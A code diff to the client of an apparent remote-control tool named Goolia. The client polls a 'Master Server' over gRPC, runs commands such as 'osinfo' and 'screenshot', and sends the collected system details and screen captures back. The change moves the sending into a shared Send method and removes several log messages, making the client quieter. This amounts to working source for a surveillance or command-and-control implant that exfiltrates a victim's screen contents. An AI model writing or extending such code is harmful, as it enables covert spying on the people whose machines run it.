@@ -5,9 +5,10 @@ import (
 	"encoding/json"
 	"io"
 	"log"
+	"runtime"
 	"time"
 
-	utils "github.com/NukeDev/Goolia/client/utils"
+	"github.com/NukeDev/Goolia/client/utils"
 	pb "github.com/NukeDev/Goolia/proto"
 	"github.com/denisbrodbeck/machineid"
 	externalip "github.com/glendc/go-external-ip"
@@ -18,6 +19,7 @@ import (
 type Client struct {
 	ID        string
 	IPAddress string
+	OS        string
 }
 
 var localClient Client
@@ -65,7 +67,6 @@ func ClientProcess() {
 					log.Println("Reloading connection...")
 					break
 				}
-				log.Printf("PING request sent to Master Server")
 				time.Sleep(time.Second * 10)
 			}
 
@@ -90,7 +91,7 @@ func ClientProcess() {
 				switch resp.Command {
 				case "ping":
 					{
-						log.Println("Ping OK!")
+
 					}
 				case "osinfo":
 					{
@@ -106,13 +107,9 @@ func ClientProcess() {
 
 						}
 
-						req := pb.Request{ClientID: localClient.ID, ClientIPAddress: localClient.IPAddress, Command: "osinfo", Data: b}
-
-						if err := stream.Send(&req); err != nil {
-							log.Printf("can not send OSINFO to master server %v", err)
+						if err := localClient.Send(resp.Command, b, stream); err != nil {
 							break
 						}
-						log.Printf("Sending OSINFO to master server")
 
 					}
 				case "screenshot":
@@ -128,13 +125,9 @@ func ClientProcess() {
 
 							}
 
-							req := pb.Request{ClientID: localClient.ID, ClientIPAddress: localClient.IPAddress, Command: "screenshot", Data: b}
-
-							if err := stream.Send(&req); err != nil {
-								log.Printf("can not send SCREENSHOTS to master server %v", err)
+							if err := localClient.Send(resp.Command, b, stream); err != nil {
 								break
 							}
-							log.Printf("Sending SCREENSHOTS to master server")
 						}
 
 					}
@@ -179,4 +172,19 @@ func (cl *Client) Generate() {
 	} else {
 		cl.IPAddress = "undefined"
 	}
+
+	cl.OS = runtime.GOOS
+}
+
+//Send response to server
+func (cl *Client) Send(command string, data []byte, stream pb.Com_HandleCommandsClient) error {
+	req := pb.Request{ClientID: cl.ID, ClientIPAddress: cl.IPAddress, Command: command, Data: data}
+
+	if err := stream.Send(&req); err != nil {
+		log.Printf("can not send %s to master server %v", command, err)
+		return err
+	}
+	log.Printf("Sending %s to master server\n", command)
+	return nil
+
 }
